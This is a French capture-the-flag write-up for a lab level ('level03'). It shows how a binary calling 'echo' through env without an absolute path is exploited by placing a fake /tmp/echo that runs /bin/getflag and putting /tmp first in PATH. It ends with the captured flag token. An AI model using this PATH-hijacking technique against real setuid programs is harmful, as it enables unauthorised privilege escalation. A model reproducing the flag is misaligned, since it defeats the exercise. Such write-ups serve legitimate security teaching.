# Level 03

## Étapes pour résoudre le challenge

1. **Identification et copie du fichier :**
   
   On commence par identifier le fichier `level03` qui est un exécutable. Pour faciliter l'analyse, nous le copions sur notre machine locale.

   ```bash
   scp -P 4242 level03@localhost:~/level03 .
   ```

2. **Examen du fichier :**

   Pour avoir une première idée du contenu du fichier, on utilise la commande `cat` :

   ```bash
   cat level03
   ```

   On y trouve une ligne intéressante :
   
   ```
   /usr/bin/env echo Exploit me
   ```

3. **Exécution du fichier :**

   Pour comprendre ce que fait le fichier, nous l'exécutons :

   ```bash
   ./level03
   ```

   Résultat :
   
   ```
   Exploit me
   ```

4. **Analyse et exploitation :**

   Le fichier exécute la commande `echo` sans utiliser de chemin absolu. Cela signifie que nous pouvons exploiter ce comportement en modifiant notre `PATH` pour que notre propre commande `echo` soit utilisée à la place.

5. **Création d'un fichier `echo` :**

   Nous créons un fichier nommé `echo` dans le répertoire `/tmp` qui contiendra une commande pour obtenir le flag.

   ```bash
   echo "/bin/getflag" > /tmp/echo
   ```

6. **Rendre le fichier exécutable :**

   Nous devons rendre ce fichier exécutable :

   ```bash
   chmod +x /tmp/echo
   ```

7. **Modifier le `PATH` :**

   Nous modifions le `PATH` pour que le répertoire `/tmp` soit recherché en premier lors de l'exécution des commandes :

   ```bash
   export PATH=/tmp:$PATH
   ```

8. **Exécution du fichier `level03` :**

   Enfin, nous exécutons de nouveau le fichier `level03` :

   ```bash
   ./level03
   ```

   Résultat :

   ```
   Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
   ```

## Résumé

Pour résoudre ce challenge, nous avons exploité la façon dont le fichier `level03` appelle la commande `echo` sans chemin absolu. En créant notre propre script `echo` dans le répertoire `/tmp` qui exécute `/bin/getflag`, et en modifiant le `PATH`, nous avons réussi à obtenir le flag.

Le flag pour `level03` est : `qi0maab88jeaj46qoumi7maus`.
